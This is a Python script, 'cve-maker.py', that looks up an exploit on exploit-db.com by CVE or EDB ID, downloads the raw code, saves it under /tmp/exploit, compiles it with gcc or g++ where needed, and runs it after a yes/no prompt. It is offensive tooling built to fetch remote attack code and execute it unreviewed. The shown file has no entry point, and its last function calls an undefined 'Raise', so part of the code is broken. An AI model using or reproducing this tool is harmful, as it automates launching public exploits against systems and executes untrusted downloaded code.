#!/usr/bin/env python3

"""
https://github.com/msd0pe-1
Source code put in public domain by msd0pe, no Copyright
Any malicious or illegal activity may be punishable by law
Use at your own risk
"""

class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    OCRA = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


try:
    import re
    import os
    import urllib
    import requests
    import subprocess
    from bs4 import BeautifulSoup

except ImportError:
    print(bcolors.RED + bcolors.BOLD + "\nError. Have you installed the requirements properly?" + bcolors.ENDC + bcolors.ENDC)
    print(bcolors.RED + bcolors.BOLD + "Be sure to run the script as follows:\n" + bcolors.ENDC + bcolors.ENDC)
    print(bcolors.OCRA + bcolors.BOLD + "python3 cve-maker.py ...." + bcolors.ENDC + bcolors.ENDC)
    print(bcolors.OCRA + bcolors.BOLD + "./cve-maker.py ...." + bcolors.ENDC + bcolors.ENDC)


exploit_db = "https://www.exploit-db.com/"


def Execute(name, langage):
    YES = {'Y', 'y', 'YES', 'yes'}
    NO = {'N', 'n', 'NO', 'no', ''}
    
    choice = input(bcolors.RED + bcolors.BOLD + "> RUN THE EXPLOIT ?" + bcolors.ENDC + bcolors.ENDC + " Y/(N)\n\n")
    if choice in YES:
        print(bcolors.BLUE + bcolors.BOLD + "\nRUNNING...\n" + bcolors.ENDC + bcolors.ENDC)
        try:
            if langage == "sh":
                subprocess.call(["sh", "/tmp/exploit/" + name + ".sh"])
            elif langage == "ruby":
                subprocess.call(["ruby", "/tmp/exploit/" + name + ".rb"])
            elif langage == "perl":
                subprocess.call(["perl", "/tmp/exploit/" + name + ".pl"])
            elif langage == "python":
                subprocess.call(["python", "/tmp/exploit/" + name + ".py"])
            elif langage == "php":
                subprocess.call(["php", "/tmp/exploit/" + name + ".php"])
            else:
                subprocess.call(["/tmp/exploit/" + name])
        except OSError:
            print(bcolors.RED + bcolors.BOLD + "Failed to run the exploit ! Maybe you forgot to specify the right langage.\nBe carefull, sometimes, CVE contains not only the payload. Use 'cat /tmp/exploit/yourexploit.something to verify if it not contains some text.'\n")
    elif choice in NO:
        exit()
    else:
        print(bcolors.RED + bcolors.BOLD + "\nYou must enter a valid letter !" + bcolors.ENDC + bcolors.ENDC)
        Execute(name, langage)


def Compilation(name, options, langage):

    print(bcolors.BLUE + bcolors.BOLD + "COMPILING...\n" + bcolors.ENDC + bcolors.ENDC)

    if langage == "sh":
        pass

    elif langage == "ruby":
        pass

    elif langage == "perl":
        pass

    elif langage == "python":
        pass

    elif langage == "php":
        pass

    elif langage == "c++":
        if options == None:
            command = ["g++", "/tmp/exploit/" + name + ".cpp", "-o", "/tmp/exploit/" + name]
            try:
                print(bcolors.OCRA + bcolors.BOLD + "> COMMAND : " + bcolors.ENDC + bcolors.ENDC + ' '.join(command))
                msg = subprocess.check_output(command)
                print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT COMPILED WITH SUCCESS : "  + bcolors.ENDC + bcolors.ENDC +"/tmp/exploit/" + name + "\n")
            except:
                print(bcolors.RED + bcolors.BOLD + "\n/!\ Error during the compilation ! /!\ " + bcolors.ENDC + bcolors.ENDC)
                print(bcolors.RED + bcolors.BOLD + "/!\ This exploit probably needs GCC options ! /!\ \n" + bcolors.ENDC + bcolors.ENDC)
                exit()
        else:
            command = ["g++", "/tmp/exploit/" + name + ".cpp", "-o", "/tmp/exploit/" + name, options]
            try:
                print(bcolors.OCRA + bcolors.BOLD + "> COMMAND : " + bcolors.ENDC + bcolors.ENDC + ' '.join(command))
                msg = subprocess.check_output(command)
                print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT COMPILED WITH SUCCESS : "  + bcolors.ENDC + bcolors.ENDC +"/tmp/exploit/" + name + "\n")
            except:
                print(bcolors.RED + bcolors.BOLD + "\n/!\ Error during the compilation ! /!\ " + bcolors.ENDC + bcolors.ENDC)
                print(bcolors.RED + bcolors.BOLD + "/!\ GCC options seams to be not correct or library missing /!\ \n" + bcolors.ENDC + bcolors.ENDC)
                exit()

    else:
        if options == None:
            command = ["gcc", "/tmp/exploit/" + name + ".c", "-o", "/tmp/exploit/" + name]
            try:
                print(bcolors.OCRA + bcolors.BOLD + "> COMMAND : " + bcolors.ENDC + bcolors.ENDC + ' '.join(command))
                msg = subprocess.check_output(command)
                print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT COMPILED WITH SUCCESS : "  + bcolors.ENDC + bcolors.ENDC +"/tmp/exploit/" + name + "\n")
            except:
                print(bcolors.RED + bcolors.BOLD + "\n/!\ Error during the compilation ! /!\ " + bcolors.ENDC + bcolors.ENDC)
                print(bcolors.RED + bcolors.BOLD + "/!\ This exploit probably needs GCC options ! /!\ \n" + bcolors.ENDC + bcolors.ENDC)
                exit()
        else:
            command = ["gcc", "/tmp/exploit/" + name + ".c", "-o", "/tmp/exploit/" + name, options]
            try:
                print(bcolors.OCRA + bcolors.BOLD + "> COMMAND : " + bcolors.ENDC + bcolors.ENDC + ' '.join(command))
                msg = subprocess.check_output(command)
                print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT COMPILED WITH SUCCESS : "  + bcolors.ENDC + bcolors.ENDC +"/tmp/exploit/" + name + "\n")
            except:
                print(bcolors.RED + bcolors.BOLD + "\n/!\ Error during the compilation ! /!\ " + bcolors.ENDC + bcolors.ENDC)
                print(bcolors.RED + bcolors.BOLD + "/!\ GCC options seams to not be correct or library missing /!\ \n" + bcolors.ENDC + bcolors.ENDC)
                exit()


def WritePayload(payload, name, langage):
    
    if langage == "sh":
        exploit = open("/tmp/exploit/" + str(name) + ".sh", "wb")
        exploit.write(payload)
        exploit.close()
        print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".sh\n") 

    elif langage == "ruby":
        exploit = open("/tmp/exploit/" + str(name) + ".rb", "wb")
        exploit.write(payload)
        exploit.close()
        print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".rb\n") 

    elif langage == "perl":
        exploit = open("/tmp/exploit/" + str(name) + ".pl", "wb")
        exploit.write(payload)
        exploit.close()
        print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".pl\n")

    elif langage == "python":
        exploit = open("/tmp/exploit/" + str(name) + ".py", "wb")
        exploit.write(payload)
        exploit.close()
        print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".py\n")

    elif langage == "php":
        exploit = open("/tmp/exploit/" + str(name) + ".php", "wb")
        exploit.write(payload)
        exploit.close()
        print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".php\n")

    elif langage == "c++":
        exploit = open("/tmp/exploit/" + str(name) + ".cpp", "wb")
        exploit.write(payload)
        exploit.close()
        print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".cpp\n")

    else:
        exploit = open("/tmp/exploit/" + str(name) + ".c", "wb")
        exploit.write(payload)
        exploit.close()
        print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".c\n") 


def FindCVE(site, cve, edb):
    
    global name
    global payload

    if site == "exploit_db":
        if edb:
            try:
                print(bcolors.OCRA + bcolors.BOLD + "\n> SEARCHING FOR : " + bcolors.ENDC + bcolors.ENDC + exploit_db + "raw/" + edb)
                sock = urllib.request.urlopen(exploit_db + "raw/" + edb)
                payload = sock.read()
                sock.close()
                name = edb
                error = re.search('Page Not Found', str(payload))

            except AttributeError:
                print(bcolors.RED + bcolors.BOLD + "\nYou are probably using Python2 ! Use Python3 to run the script.\n" + bcolors.ENDC + bcolors.ENDC)

            except urllib.error.HTTPError:
                print(bcolors.RED + bcolors.BOLD + "\nExploit not found ! Verify your ECB-ID.\n" + bcolors.ENDC + bcolors.ENDC)
                exit()
       
        elif cve:
            print(bcolors.OCRA + bcolors.BOLD + "\n> SEARCHING FOR : " + bcolors.ENDC + bcolors.ENDC + exploit_db + "search?cve=" + cve) 
            header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36","X-Requested-With": "XMLHttpRequest"}
            url = exploit_db + "search?cve=" + cve
            sock_cve = requests.get(url, headers = header)
            findme = BeautifulSoup(sock_cve.text, 'html.parser')
            try:
                cve_edb = re.search('exploit_id\"\:\"(.*?)\"\,\"code_type', str(findme)).group(1)
                print(bcolors.PURPLE + bcolors.BOLD + "> DETERMINATION OF THE EDB ID : " + bcolors.ENDC + bcolors.ENDC + cve_edb)
                sock_edb = urllib.request.urlopen(exploit_db + "raw/" + cve_edb)
                payload = sock_edb.read()
                sock_edb.close()
                name = cve_edb

            except AttributeError:
                print(bcolors.RED + bcolors.BOLD + "\nCVE name seams to not be correct.\n" + bcolors.ENDC + bcolors.ENDC)	   


def CreateDirectory():
    try: 
        os.makedirs("/tmp/exploit")
    except OSError:
        if not os.path.isdir("/tmp/exploit"):
            Raise

